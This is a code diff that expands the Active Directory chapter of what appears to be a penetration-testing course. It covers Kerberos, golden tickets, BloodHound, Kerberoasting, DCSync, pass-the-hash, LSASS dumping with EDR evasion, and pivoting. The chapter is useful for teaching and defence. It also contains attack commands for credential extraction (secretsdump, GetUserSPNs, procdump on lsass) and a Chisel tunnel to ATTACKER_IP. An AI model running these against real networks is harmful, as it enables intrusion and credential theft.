@@ -69,10 +69,11 @@ export const chapter9: RoadmapChapter = {
         }
       ],
       keyTopics: [
-        "Active Directory architecture: Objects, Organizational Units (OUs), Domains, Trees, and Forests",
-        "Domain Controllers, LDAP, SMB, and the `NTDS.dit` central database",
-        "Kerberos 5 protocol flow: AS-REQ, AS-REP, TGS-REQ, TGS-REP, and AP-REQ",
-        "The role of the `krbtgt` service account and golden ticket mechanics",
+        "Active Directory Organizational Hierarchy (Objects, OUs, Trees, Forests): Active Directory Domain Services (AD DS) manages enterprise identity and resource authorization. Objects (users, computers, groups) are organized into Organizational Units (OUs) that inherit Group Policy Objects (GPOs). A Domain represents a shared security database (NTDS.dit); multiple domains sharing a contiguous namespace form a Tree, and multiple trees sharing a common Schema and Global Catalog form an enterprise Forest.",
+        "Domain Controllers, LDAP & The NTDS.dit Database: Domain Controllers (DCs) host the core network daemons powering Active Directory: LDAP/LDAPS (ports 389/636), Kerberos (port 88), DNS (port 53), and SMB (port 445). The entire domain database resides in %SystemRoot%\\NTDS\\NTDS.dit, an extensible storage engine database containing all domain user accounts, group memberships, and NTLM password hashes for every identity in the organization.",
+        "Two-Way Transitive & Cross-Forest Trust Relationships: Trust relationships allow users in one domain to access resources in another domain. Two-way transitive trusts automatically extend authentication across all child domains in a forest. Attackers who compromise a low-security subsidiary child domain exploit misconfigured trust attributes (such as SID History filtering disabled) to forge foreign security identifiers and escalate privileges directly into the root parent forest.",
+        "The Kerberos 5 Authentication Protocol Flow: Kerberos authentication operates via a ticket-granting service model: 1. The client transmits an AS-REQ (Authentication Service Request) containing a timestamp encrypted with their password hash; 2. The DC verifies the timestamp and returns an AS-REP containing the Ticket Granting Ticket (TGT) encrypted with the secret krbtgt key; 3. The client presents the TGT to request access to a specific service (TGS-REQ); 4. The DC returns a Ticket Granting Service (TGS) ticket encrypted with the target service account's password hash; 5. The client presents the TGS to the service (AP-REQ) to gain access.",
+        "The krbtgt Account & Golden Ticket Cryptographic Forgery: The 'krbtgt' account is the master service account in Active Directory whose password hash encrypts all Kerberos Ticket Granting Tickets (TGTs) across the entire domain. If an attacker compromises the Domain Controller and extracts the krbtgt NTLM hash, they can forge a 'Golden Ticket' using Mimikatz. A Golden Ticket allows the attacker to mint arbitrary Kerberos tickets granting Domain Admin rights to any service, persisting indefinitely even if all other passwords are reset.",
       ],
       terminalCommands: [
         "# Enumerate domain controller IP via DNS SRV records:",
@@ -144,10 +145,11 @@ export const chapter9: RoadmapChapter = {
         }
       ],
       keyTopics: [
-        "Graph theory applications in Active Directory security assessments",
-        "Executing SharpHound data collection across LDAP and SMB sessions",
-        "Analyzing BloodHound graph edges: `GenericAll`, `WriteDacl`, `MemberOf`",
-        "Live domain querying using PowerView cmdlets in PowerShell",
+        "Graph Theory Applications in Active Directory Exploitation: Modern enterprise Active Directory forests contain tens of thousands of users, computers, security groups, GPOs, and Access Control Entries (ACEs). System administrators can never visualize the indirect transitive privilege chains created over years of employee onboarding and department transfers. BloodHound applies graph theory algorithms (built on the Neo4j graph database) to model Active Directory objects as nodes and permissions as directed edges, mathematically computing the shortest attack path to Domain Admin.",
+        "SharpHound Telemetry Ingestion & Collection Modes: SharpHound is the official data collection agent for BloodHound, compiled in C#. Executed from a compromised domain workstation, SharpHound queries LDAP directory records, queries the Domain Controller for active SMB user sessions, and inspects local Administrators groups across reachable hosts. SharpHound packages the collected telemetry into compressed JSON files that are imported directly into the BloodHound GUI.",
+        "High-Risk Active Directory Access Control List (ACL) Edges: BloodHound identifies dangerous discretionary access control permissions that allow unprivileged users to compromise high-privilege objects. Critical edges include: 'GenericAll' (grants complete control over the target object), 'GenericWrite' (allows modifying object attributes like scriptPath), 'WriteDacl' (allows granting oneself full permissions over the target), and 'ForceChangePassword' (allows resetting a target user's password without knowing their existing password).",
+        "PowerView PowerShell Command-Line Directory Enumeration: PowerView (part of the PowerSploit suite) wraps ADSI and .NET directory services into powerful PowerShell cmdlets for interactive domain querying. Key cmdlets include 'Get-DomainUser' (lists user attributes, description notes, and SPNs), 'Get-DomainComputer' (enumerates domain workstations and OS versions), and 'Find-LocalAdminAccess' (scans the network to identify all workstations where the current user possesses Local Administrator rights).",
+        "Active Directory Session Hunting & High-Value Target Tracking: Session hunting locates where specific high-value users (such as Domain Admins or executive accounts) are currently logged into the network. Using PowerView's 'Find-DomainUserLocation', researchers query network hosts for active interactive and network logon sessions. Locating a workstation where a Domain Admin is logged in pinpoints the exact physical target host an attacker must compromise to dump credentials from memory.",
       ],
       terminalCommands: [
         "./SharpHound.exe -c All --zipfilename target_ad_data.zip",
@@ -219,10 +221,11 @@ export const chapter9: RoadmapChapter = {
         }
       ],
       keyTopics: [
-        "Kerberoasting mechanics and Service Principal Name (SPN) querying",
-        "AS-REP Roasting vulnerabilities on accounts with `DONT_REQ_PREAUTH`",
-        "Extracting Kerberos ticket hashes with Impacket (`GetUserSPNs.py`, `GetNPUsers.py`) and Rubeus",
-        "GPU cracking with Hashcat modes `-m 13100` (TGS) and `-m 18200` (AS-REP)",
+        "Kerberoasting Attack Mechanics & SPN Targeting: Kerberoasting exploits the fundamental design of the Kerberos 5 protocol to extract and crack service account password hashes offline without touching the target service. Any authenticated domain user can request a Kerberos TGS ticket for any account with a registered Service Principal Name (SPN, such as MSSQLSvc/db.corp.local). Because the DC encrypts this TGS ticket using the service account's password hash, the attacker extracts the ticket from memory and cracks it offline.",
+        "Offline GPU Ticket Cracking with Hashcat (-m 13100): Extracted Kerberos TGS tickets are formatted into Hashcat-compatible hash strings ($krb5tgs$23$*service_account*...). Hashcat mode -m 13100 utilizes GPU acceleration to perform high-speed dictionary attacks against the extracted ticket. Because service accounts frequently possess elevated privileges (local administrator rights on database servers or Domain Admin rights) and use weak, non-expiring passwords, cracking the hash grants instant administrative access.",
+        "AS-REP Roasting on Pre-Authentication Disabled Accounts: Normally, when a user requests a TGT (AS-REQ), they must encrypt a timestamp with their password hash to prove their identity before the DC issues any encrypted material. If an administrator checks 'Do not require Kerberos preauthentication' on a user account (DONT_REQ_PREAUTH), ANY user can send an AS-REQ for that account, and the DC immediately returns an AS-REP encrypted with that user's password hash. Attackers crack these hashes offline using Hashcat mode -m 18200.",
+        "Executing Kerberos Attacks with Impacket & Rubeus: From Linux attack machines, Impacket's 'GetUserSPNs.py' automates querying the Domain Controller for all accounts with SPNs and requesting their TGS tickets in a single command. Impacket's 'GetNPUsers.py' automates querying for accounts with pre-authentication disabled. In Windows environments, Rubeus executes both Kerberoasting and AS-REP Roasting entirely in memory, evading disk-based antivirus inspection.",
+        "Defensive Engineering: Group Managed Service Accounts (gMSA): Organizations defend against Kerberoasting by migrating standard user service accounts to Group Managed Service Accounts (gMSA). In a gMSA configuration, Active Directory automatically generates 128-character cryptographically random passwords for the service account and rotates the password automatically every 30 days. Because the password is mathematically impossible to crack offline, Kerberoasting attacks are rendered completely ineffective.",
       ],
       terminalCommands: [
         "impacket-GetUserSPNs corp.target.com/user:pass -dc-ip 10.10.10.1 -request",
@@ -292,10 +295,11 @@ export const chapter9: RoadmapChapter = {
         }
       ],
       keyTopics: [
-        "Dumping LSASS process memory for plaintext credentials and NTLM hashes",
-        "Executing remote DCSync attacks with `impacket-secretsdump`",
-        "Pass-the-Hash (PtH) lateral movement mechanics across SMB and WinRM",
-        "Converting NTLM hashes to Kerberos TGTs via Overpass-the-Hash",
+        "Dumping Credentials from LSASS Memory with Mimikatz: The Local Security Authority Subsystem Service (lsass.exe) is the core Windows process responsible for verifying user logins, enforcing security policies, and storing active authentication credentials. Benjamin Delpy's Mimikatz hooks into LSASS memory using debugging privileges ('privilege::debug') to extract plaintext passwords (via WDigest), NTLM password hashes ('sekurlsa::logonpasswords'), and active Kerberos tickets from memory.",
+        "The Remote DCSync Attack (Directory Replication Service): Once an attacker compromises an account possessing Directory Replication rights (granted to Domain Admins and Enterprise Admins), they can execute a DCSync attack using Impacket's 'secretsdump.py'. The attacker's machine simulates being a Domain Controller and requests replication data from the primary DC via the MS-DRSR protocol. The primary DC replicates the entire database, handing over the NTLM hashes of every user in the domain without the attacker executing code on the DC.",
+        "Pass-the-Hash (PtH) Lateral Movement Mechanics: NTLM authentication verifies identities using a challenge-response calculation based on the MD4/NTLM hash of the password, never the plaintext password. An attacker who extracts an administrative NTLM hash does not need to crack it; they can use the raw hash directly to authenticate across SMB (port 445), WinRM (port 5985), and RPC services using tools like NetExec or Impacket's wmiexec.py, executing remote commands as SYSTEM.",
+        "Overpass-the-Hash (Pass-the-Key) to Kerberos TGTs: Overpass-the-Hash converts an extracted NTLM hash or AES encryption key into a valid Kerberos Ticket Granting Ticket (TGT). Using tools like Rubeus or Impacket, the attacker presents the user's NTLM hash to the Domain Controller in an AS-REQ exchange to request a legitimate Kerberos TGT. This allows attackers to transition seamlessly from NTLM authentication to ticket-based Kerberos lateral movement, evading NTLM-blocking policies.",
+        "LSASS Memory Evasion & Procdump Triage: Modern Windows Defender and EDR agents aggressively block Mimikatz from accessing LSASS memory. Attackers evade detection by dumping LSASS using legitimate, digitally signed Microsoft utilities like Sysinternals 'procdump.exe' ('procdump -ma lsass.exe lsass.dmp') or via Task Manager. The resulting crash dump file is exfiltrated to the attacker's Kali machine and parsed offline using 'pypykatz', extracting credentials without triggering on-host alerts.",
       ],
       terminalCommands: [
         "impacket-secretsdump -just-dc-ntlm corp.target.com/admin:pass@10.10.10.1",
@@ -370,10 +374,11 @@ export const chapter9: RoadmapChapter = {
         }
       ],
       keyTopics: [
-        "Network pivoting theory across firewalled DMZs and internal enclaves",
-        "Deploying reverse SOCKS5 proxies using Chisel over WebSockets",
-        "Ligolo-ng virtual TUN interface deployment for native IP subnet routing",
-        "Multi-hop double pivoting techniques across air-gapped network tiers",
+        "Enterprise Network Segmentation & The Pivoting Dilemma: Enterprise corporate networks enforce zero-trust segmentation between external DMZ enclaves, internal user subnets, and isolated server tiers using internal firewalls. A compromised web server in the DMZ typically possesses two network interfaces: a public interface and an internal interface (e.g. 10.10.10.5). Pivoting uses this compromised dual-homed host as an encrypted relay to route attack traffic into internal subnets that are physically unreachable from the attacker's external machine.",
+        "Chisel Reverse SOCKS5 Proxying over WebSockets: Chisel is a high-speed TCP/UDP tunnel written in Go that encapsulates traffic inside an encrypted HTTP/WebSocket connection. Because corporate egress firewalls permit outbound web traffic (ports 80 and 443), an attacker runs a Chisel server on their public VPS and executes a Chisel client on the compromised target ('chisel client ATTACKER_IP:8000 R:1080:socks'). This opens a local SOCKS5 proxy on the attacker's machine, routing all tool traffic through the internal pivot host.",
+        "Ligolo-ng Virtual TUN Interface Architecture: Unlike traditional proxy tools (like Proxychains) that rely on user-space library hooking and fail on raw ICMP or SYN scans, Ligolo-ng establishes a true virtual TUN network interface on the attacker's Linux kernel. Running Ligolo-ng allows the attacker to add internal corporate subnets directly to their operating system routing table ('ip route add 10.10.10.0/24 dev ligolo'). This enables running Nmap SYN scans, ping, and Impacket natively without proxy wrappers.",
+        "Multi-Hop Pivoting & Traversing Air-Gapped Segments: Complex red team assessments often require double or triple pivoting: relaying traffic through a DMZ web server to reach an internal workstation network, then pivoting through a compromised workstation to reach an air-gapped industrial SCADA network. Attackers chain multiple Chisel or Ligolo-ng relays, establishing nested tunnels where each hop forwards traffic deeper into restricted corporate enclaves.",
+        "Dynamic SOCKS5 Configuration in Proxychains & Browser Testing: Once an encrypted pivot tunnel is established, attackers configure /etc/proxychains4.conf to point to the local SOCKS5 port (socks5 127.0.0.1 1080). Prepending 'proxychains' to command-line tools routes TCP connections through the compromised host. For web applications, attackers configure browser proxy extensions (FoxyProxy) to route browser sessions through the SOCKS5 proxy, allowing interactive manual testing of internal corporate web portals.",
       ],
       terminalCommands: [
         "chisel server --reverse --port 8000",
